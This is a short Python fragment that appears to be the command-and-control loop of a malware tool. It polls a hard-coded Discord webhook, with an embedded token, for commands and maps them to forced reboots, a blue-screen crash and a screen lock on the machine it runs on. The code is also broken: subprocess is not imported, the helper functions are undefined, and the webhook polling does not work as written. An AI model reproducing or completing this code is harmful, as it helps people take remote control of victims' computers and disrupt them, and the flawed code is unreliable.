import requests
import time

WEBHOOK_URL = "https://discord.com/api/webhooks/1356810627909419079/5L26qDamgl753mBQL873Mq982SK6K4_2HH-mMmrfkOASId1GXyup-vVKOXbbDw6OC2iO"

def check_for_commands():
    while True:
        try:
            # Poll the webhook for new messages (commands)
            response = requests.get(WEBHOOK_URL)
            if response.status_code == 200:
                data = response.json()
                if 'content' in data:
                    command = data['content'].strip()
                    if command:
                        print(f"[*] Received command: {command}")
                        execute_command(command)  # Executes the command (RESTART, BSOD, etc.)
        except Exception as e:
            print(f"[!] Failed to check commands: {e}")
        
        # Check every 5 seconds (adjust if needed)
        time.sleep(5)

# A simple function to execute received commands
def execute_command(command):
    if command == "RESTART":
        subprocess.call("shutdown /r /t 0", shell=True)
    elif command == "BSOD":
        trigger_bsod()
    elif command == "LOCKSCREEN":
        show_lock_screen_gui()
    elif command == "UNLOCKSCREEN":
        hide_lock_screen_gui()

# Call this in your main function
check_for_commands()
